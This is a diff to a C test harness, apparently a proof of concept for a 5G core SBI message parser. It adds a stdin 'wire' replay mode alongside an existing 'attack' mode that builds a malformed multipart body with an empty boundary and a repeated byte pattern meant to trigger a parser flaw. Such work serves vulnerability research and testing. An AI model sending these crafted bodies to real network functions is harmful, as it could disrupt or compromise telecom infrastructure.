@@ -153,19 +153,27 @@ int main(int argc, char **argv)
     ogs_sbi_message_t message;
     int rv;
 
-    if (strcmp(mode, "attack") == 0) {
-        /* Real empty-boundary body: leading CRLF is consumed as preamble,
-         * the next CRLF makes the extracted boundary empty, and the rest is
-         * byte-for-byte the staged 394-byte body handed to the parser. */
-        body[n++] = '\r'; body[n++] = '\n';
-    }
-    memcpy(body + n, PREFIX, sizeof(PREFIX) - 1);
-    n += sizeof(PREFIX) - 1;
-    body[n++] = '\n';
-    if (strcmp(mode, "attack") == 0 || strcmp(mode, "staged") == 0) {
-        for (i = 0; i < 3 * PATTERN_REPEAT; i++)
-            body[n + i] = (unsigned char)PATTERN[k++ % 3];
-        n += 3 * PATTERN_REPEAT;
+    if (strcmp(mode, "wire") == 0) {
+        /* Loopback wire replay: the HTTP/2 listener supplies the exact
+         * request body on stdin; the parse path below is unchanged. */
+        int ch;
+        while (n < sizeof(body) && (ch = getchar()) != EOF)
+            body[n++] = (unsigned char)ch;
+    } else {
+        if (strcmp(mode, "attack") == 0) {
+            /* Real empty-boundary body: leading CRLF is consumed as preamble,
+             * the next CRLF makes the extracted boundary empty, and the rest
+             * is byte-for-byte the staged 394-byte body handed to the parser. */
+            body[n++] = '\r'; body[n++] = '\n';
+        }
+        memcpy(body + n, PREFIX, sizeof(PREFIX) - 1);
+        n += sizeof(PREFIX) - 1;
+        body[n++] = '\n';
+        if (strcmp(mode, "attack") == 0 || strcmp(mode, "staged") == 0) {
+            for (i = 0; i < 3 * PATTERN_REPEAT; i++)
+                body[n + i] = (unsigned char)PATTERN[k++ % 3];
+            n += 3 * PATTERN_REPEAT;
+        }
     }
 
     http.content = (char *)body;
